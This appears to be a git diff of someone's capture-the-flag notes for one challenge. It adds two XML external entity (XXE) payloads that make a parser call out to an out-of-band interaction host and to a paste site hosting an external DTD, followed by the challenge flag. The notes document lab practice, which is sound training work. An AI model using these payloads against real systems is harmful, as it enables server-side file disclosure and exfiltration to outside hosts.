@@ -286,7 +286,35 @@ FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/mwex0emeea7ycbs4pwjim2k1jrof
 ## Chall 5
 
 ![[IMG-20251205031810382.png]]
+https://app.interactsh.com/#/
+
+```xml
+<!DOCTYPE xxe [
+  <!ENTITY test SYSTEM "http://azxtrmtedzbcsenavtvoj2xgzxir184d7.oast.fun/">
+]>
+<doc>&test;</doc>
+```
+
+![[IMG-20251205035312111.png]]
+
+https://paste.c-net.org/
+
+![[IMG-20251205033822725.png]]
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"https://paste.c-net.org/WenchBusted"> %xxe;]>
+<doc>&xxe;
+```
+
+![[IMG-20251205034011844.png]]
+
 
 ```
 FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/qk7gi3xb2a3rzsx9edxylqczm4xvq9xm-end.html}
 ```
+
+## Chall 6
+
+
